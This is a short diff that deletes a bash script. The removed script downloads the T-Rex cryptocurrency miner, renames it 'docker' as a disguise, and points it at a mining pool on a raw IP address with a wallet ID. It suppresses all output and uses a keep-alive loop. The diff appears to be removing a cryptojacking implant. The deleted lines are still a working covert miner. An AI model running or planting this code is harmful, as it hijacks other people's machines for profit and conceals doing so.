@@ -1,5 +1,0 @@
-#!/bin/bash
-wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
-mv t-rex docker
-./docker -a progpowz -o stratum+tcp://172.104.78.161:80 -u iE3pc61xqN3G5t28gBTSbKWLbaWWCvcKy1JvyJHKMidJLdFAz9VVU6m7rVeMECzpV2KHJVsUsS2ELDK6uy1TCVFpVzy12K99GNL1SzuPTXJM.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
